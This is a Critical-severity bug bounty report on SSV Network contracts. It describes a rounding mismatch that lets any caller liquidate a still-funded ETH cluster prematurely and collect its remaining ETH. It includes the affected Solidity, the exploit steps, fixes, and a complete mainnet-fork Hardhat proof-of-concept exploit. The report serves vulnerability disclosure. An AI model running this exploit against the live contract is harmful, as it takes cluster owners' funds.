# Premature ETH cluster liquidation transfers remaining user balance when EB fee rounding is inconsistent
Severity: Critical

Bounty Criteria Match: critical (smart contract): Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

Affected Contracts / Code Paths:
- In-scope asset: `SSVNetwork.liquidate` delegates to cluster liquidation on the in-scope network contract: [`SSVNetwork.sol#L271-L277`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/SSVNetwork.sol#L271-L277), [`SSVClusters.liquidate#L31-L64`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/modules/SSVClusters.sol#L31-L64)
- `ClusterLib.isLiquidatableWithEB` and `ClusterLib.updateBalanceWithEB`: [`ClusterLib.sol#L67-L83`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/libraries/ClusterLib.sol#L67-L83), [`ClusterLib.sol#L306-L320`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/libraries/ClusterLib.sol#L306-L320)
- Liquidator payout path: [`SSVClusters.sol#L603-L612`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/modules/SSVClusters.sol#L603-L612)

# Finding Description and Impact
An ETH cluster can be liquidated while its balance still covers the fee runway computed by the protocol's actual balance-decay math. Because liquidation is permissionless and pays the whole remaining cluster balance to the caller, the rounding mismatch lets a third party take user ETH prematurely.

- `updateBalanceWithEB` floors operator and network fee usage separately.
- `isLiquidatableWithEB` adds operator and network rates before flooring, which can produce a threshold one packed ETH unit higher than the balance-decay runway.
- `liquidate` accepts that inflated threshold and `_executeLiquidation` transfers the remaining ETH balance to `msg.sender`.

The attacker does not need oracle, owner, operator-owner, or governance privileges. A valid EB snapshot is normal protocol state for ETH cluster accounting; the PoC's fork-only oracle/storage setup is scaffolding to reproduce normal EB snapshot state locally, not a live attacker precondition. Once a funded cluster is at the boundary, the exploit transaction is a single third-party `SSVNetwork.liquidate(...)` call.

The liquidation path updates the balance, then checks the inflated EB threshold:

```solidity
cluster.updateClusterData(hashedCluster, clusterIndex, sp.currentNetworkFeeIndex());

if (
    clusterOwner != msg.sender &&
    !cluster.isLiquidatableWithEB(
        hashedCluster,
        burnRate,
        PackedETH.unwrap(sp.ethNetworkFee),
        sp.minimumBlocksBeforeLiquidation,
        sp.minimumLiquidationCollateral
    )
) {
    revert ClusterNotLiquidatable();
}
```

The two accounting paths round different expressions:

```solidity
uint256 thresholdUnits = (uint256(minimumBlocksBeforeLiquidation) * rate * units) / BPS_DENOMINATOR;
uint256 liquidationThreshold = thresholdUnits * ETH_DEDUCTED_DIGITS;
return cluster.balance < liquidationThreshold;

uint128 networkFeeUnits = (idxNet * units) / BPS_DENOMINATOR;
uint128 usageUnits = (idxOp * units) / BPS_DENOMINATOR + networkFeeUnits;
uint256 usage = uint256(usageUnits) * ETH_DEDUCTED_DIGITS;
```

The full remaining cluster balance is paid to the liquidator:

```solidity
uint256 balanceLiquidatable = cluster.balance;
cluster.balance = 0;
cluster.active = false;

if (balanceLiquidatable > 0) {
    CoreLib.transferBalance(liquidator, balanceLiquidatable);
}
```

### **Exploit Path**
1. An ETH cluster with a valid EB snapshot reaches an operator/network-fee boundary where combined-rate flooring exceeds separately rounded fee usage.
2. The owner balance remains at or above the separately rounded runway after normal settlement.
3. Any unprivileged third party calls `SSVNetwork.liquidate` with the current cluster state.
4. `isLiquidatableWithEB` returns true solely because of the higher combined threshold.
5. `_executeLiquidation` deactivates the cluster and transfers the remaining ETH balance to the caller.

### **Impact**
- Direct theft of the cluster owner's remaining ETH balance from the in-scope `SSVNetwork` contract.
- Premature cluster deactivation even though the separately rounded fee runway is still funded.
- The verified local mainnet-fork PoC demonstrates a third-party liquidator receiving the remaining ETH.

This matches Critical because an unprivileged caller can directly receive user funds at rest in the protocol.

### **Recommended Mitigation Steps**
- Use one canonical EB fee calculation for both balance decay and liquidation threshold checks.
- Prefer computing the liquidation threshold with the same separately rounded operator and network components used by `updateBalanceWithEB`, or update both paths to a shared helper.
- Add boundary tests that assert balances equal to the settled fee runway cannot be liquidated.

## Proof of Concept

The PoC is a non-harmful local mainnet-fork simulation. It attaches to the in-scope `SSVNetwork` and `SSVNetworkViews` deployments, uses fork-only storage writes to permit throwaway oracle voters, and then proves that an unprivileged `liquidator` account receives the cluster's remaining ETH while the separately rounded fee runway is still covered. It does not broadcast live transactions or mutate live protocol state.

Save as: `test/PrematureLiquidationRoundingPoC.test.ts`

Run: `MAINNET_RPC_URL=<mainnet rpc url> NO_GAS_ENFORCE=true npx hardhat test test/PrematureLiquidationRoundingPoC.test.ts`

```typescript
import { expect } from "chai";
import { ethers } from "ethers";
import { getForkedConnection } from "./setup/connection.ts";
import { DEFAULT_SHARES, ETH_DEDUCTED_DIGITS, BPS_DENOMINATOR } from "./common/constants.ts";
import { Events } from "./common/events.ts";
import { createCluster, computeClusterId, computeEBRoot, parseClusterFromEvent } from "./common/helpers.ts";
import { setAccountBalance } from "./helpers/blocks.ts";
import { expectETHDelta } from "./helpers/balance.ts";
import { ForkConfig } from "./forked/v2.0.0/config.ts";

const SSV_STORAGE_STAKING_POSITION =
  BigInt(ethers.keccak256(ethers.toUtf8Bytes("ssv.network.storage.staking"))) - 1n;
const ORACLE_ID_OF_SLOT = SSV_STORAGE_STAKING_POSITION + 4n;

function packedStorageSlot(keyType: string, key: string, slot: bigint): string {
  return ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode([keyType, "uint256"], [key, slot]));
}

function toWord(value: bigint): string {
  return ethers.zeroPadValue(ethers.toBeHex(value), 32);
}

function makeUnique48ByteHex(label: string): string {
  const first = ethers.keccak256(ethers.toUtf8Bytes(`${label}:0`)).slice(2);
  const second = ethers.keccak256(ethers.toUtf8Bytes(`${label}:1`)).slice(2, 34);
  return `0x${first}${second}`;
}

function feeUsage(elapsedBlocks: bigint, burnRate: bigint, networkFee: bigint, vUnits: bigint): bigint {
  const operatorUnits = (elapsedBlocks * burnRate * vUnits) / BPS_DENOMINATOR;
  const networkUnits = (elapsedBlocks * networkFee * vUnits) / BPS_DENOMINATOR;
  return (operatorUnits + networkUnits) * ETH_DEDUCTED_DIGITS;
}

function findRoundingBoundary(params: {
  minOperatorFee: bigint;
  maxOperatorFee: bigint;
  networkFee: bigint;
  minimumBlocksBeforeLiquidation: bigint;
  minimumLiquidationCollateral: bigint;
}): {
  operatorFee: bigint;
  effectiveBalance: number;
  vUnits: bigint;
  separateThreshold: bigint;
  combinedThreshold: bigint;
} {
  const minRaw = params.minOperatorFee / ETH_DEDUCTED_DIGITS;
  const maxRaw = params.maxOperatorFee / ETH_DEDUCTED_DIGITS;
  const networkFeeRaw = params.networkFee / ETH_DEDUCTED_DIGITS;

  for (let operatorFeeRaw = minRaw; operatorFeeRaw <= maxRaw; operatorFeeRaw++) {
    for (let effectiveBalance = 32n; effectiveBalance <= 2048n; effectiveBalance++) {
      const vUnits = (effectiveBalance * BPS_DENOMINATOR + 31n) / 32n;
      const burnRate = 4n * operatorFeeRaw;
      const operatorThresholdUnits =
        (params.minimumBlocksBeforeLiquidation * burnRate * vUnits) / BPS_DENOMINATOR;
      const networkThresholdUnits =
        (params.minimumBlocksBeforeLiquidation * networkFeeRaw * vUnits) / BPS_DENOMINATOR;
      const separateThreshold = (operatorThresholdUnits + networkThresholdUnits) * ETH_DEDUCTED_DIGITS;
      const combinedThreshold =
        ((params.minimumBlocksBeforeLiquidation * (burnRate + networkFeeRaw) * vUnits) / BPS_DENOMINATOR) *
        ETH_DEDUCTED_DIGITS;

      if (
        combinedThreshold - separateThreshold === ETH_DEDUCTED_DIGITS &&
        combinedThreshold > params.minimumLiquidationCollateral
      ) {
        return {
          operatorFee: operatorFeeRaw * ETH_DEDUCTED_DIGITS,
          effectiveBalance: Number(effectiveBalance),
          vUnits,
          separateThreshold,
          combinedThreshold,
        };
      }
    }
  }

  throw new Error("No one-unit liquidation rounding boundary found for current fork parameters");
}

describe("C-5 premature ETH cluster liquidation rounding PoC", function () {
  it("liquidates a cluster that still covers the separately rounded fee runway", async function () {
    const { connection } = await getForkedConnection();
    const provider = connection.ethers.provider;
    const [operatorOwner, clusterOwner, liquidator, oracle1, oracle2, oracle3] =
      await connection.ethers.getSigners();

    const network = (await connection.ethers.getContractFactory("SSVNetwork")).attach(ForkConfig.SSV_NETWORK_ADDRESS);
    const views = (await connection.ethers.getContractFactory("SSVNetworkViews")).attach(ForkConfig.SSV_NETWORK_VIEWS);

    for (const signer of [operatorOwner, clusterOwner, liquidator, oracle1, oracle2, oracle3]) {
      await setAccountBalance(provider, signer.address, connection.ethers.parseEther("100"));
    }

    // Local fork setup: allow throwaway oracle voters without using live privileged accounts.
    for (const [oracle, id] of [
      [oracle1, 1n],
      [oracle2, 2n],
      [oracle3, 3n],
    ] as const) {
      await provider.send("hardhat_setStorageAt", [
        ForkConfig.SSV_NETWORK_ADDRESS,
        packedStorageSlot("address", oracle.address, ORACLE_ID_OF_SLOT),
        toWord(id),
      ]);
    }

    const params = {
      minOperatorFee: BigInt(await views.getMinimumOperatorEthFee()),
      maxOperatorFee: BigInt(await views.getMaximumOperatorFee()),
      networkFee: BigInt(await views.getNetworkFee()),
      minimumBlocksBeforeLiquidation: BigInt(await views.getLiquidationThresholdPeriod()),
      minimumLiquidationCollateral: BigInt(await views.getMinimumLiquidationCollateral()),
    };
    const boundary = findRoundingBoundary(params);

    const operatorIds: bigint[] = [];
    for (let i = 0; i < 4; i++) {
      const operatorKey = makeUnique48ByteHex(`C-5 operator ${i}`);
      const operatorId = await network.connect(operatorOwner).registerOperator.staticCall(
        operatorKey,
        boundary.operatorFee,
        false
      );
      await network.connect(operatorOwner).registerOperator(operatorKey, boundary.operatorFee, false);
      operatorIds.push(BigInt(operatorId));
    }

    const initialDeposit = connection.ethers.parseEther("1");
    const registerTx = await network.connect(clusterOwner).registerValidator(
      makeUnique48ByteHex("C-5 validator"),
      operatorIds,
      DEFAULT_SHARES,
      createCluster(),
      { value: initialDeposit }
    );
    const clusterAfterRegister = parseClusterFromEvent(network, await registerTx.wait(), Events.VALIDATOR_ADDED);
    const clusterId = computeClusterId(clusterOwner.address, operatorIds);

    const rootBlock = await provider.getBlockNumber();
    const root = computeEBRoot(clusterId, boundary.effectiveBalance);
    await network.connect(oracle1).commitRoot(root, rootBlock);
    await network.connect(oracle2).commitRoot(root, rootBlock);
    await network.connect(oracle3).commitRoot(root, rootBlock);

    const updateTx = await network.updateClusterBalance(
      rootBlock,
      clusterOwner.address,
      operatorIds,
      clusterAfterRegister,
      boundary.effectiveBalance,
      []
    );
    const updateReceipt = await updateTx.wait();
    const clusterAfterEB = parseClusterFromEvent(network, updateReceipt, Events.CLUSTER_BALANCE_UPDATED);

    const burnRate = 4n * (boundary.operatorFee / ETH_DEDUCTED_DIGITS);
    const networkFeeRaw = params.networkFee / ETH_DEDUCTED_DIGITS;
    const oneBlockUsage = feeUsage(1n, burnRate, networkFeeRaw, boundary.vUnits);
    const postSettlementBalance = boundary.combinedThreshold - 1n;
    const targetBalanceBeforeTrigger = postSettlementBalance + oneBlockUsage;

    // Boundary: combined rounding exceeds the separately rounded runway by one packed unit.
    expect(postSettlementBalance).to.be.gte(boundary.separateThreshold);
    expect(postSettlementBalance).to.be.lessThan(boundary.combinedThreshold);

    const withdrawUsage = feeUsage(1n, burnRate, networkFeeRaw, boundary.vUnits);
    const balanceAtWithdraw = BigInt(clusterAfterEB.balance) - withdrawUsage;
    const withdrawAmount = balanceAtWithdraw - targetBalanceBeforeTrigger;
    expect(withdrawAmount).to.be.greaterThan(0n);

    const withdrawTx = await network.connect(clusterOwner).withdraw(operatorIds, withdrawAmount, clusterAfterEB);
    const clusterBeforeLiquidation = parseClusterFromEvent(network, await withdrawTx.wait(), Events.CLUSTER_WITHDRAWN);
    expect(BigInt(clusterBeforeLiquidation.balance)).to.equal(targetBalanceBeforeTrigger);

    // Trigger and proof: third-party liquidation receives funds while separate rounding is still covered.
    const liquidateReceipt = await expectETHDelta(
      provider,
      liquidator.address,
      () => network.connect(liquidator).liquidate(clusterOwner.address, operatorIds, clusterBeforeLiquidation),
      postSettlementBalance,
      { accountForGas: true }
    );
    const liquidatedCluster = parseClusterFromEvent(network, liquidateReceipt, Events.CLUSTER_LIQUIDATED);

    expect(liquidatedCluster.active).to.equal(false);
    expect(BigInt(liquidatedCluster.balance)).to.equal(0n);
  });
});
```
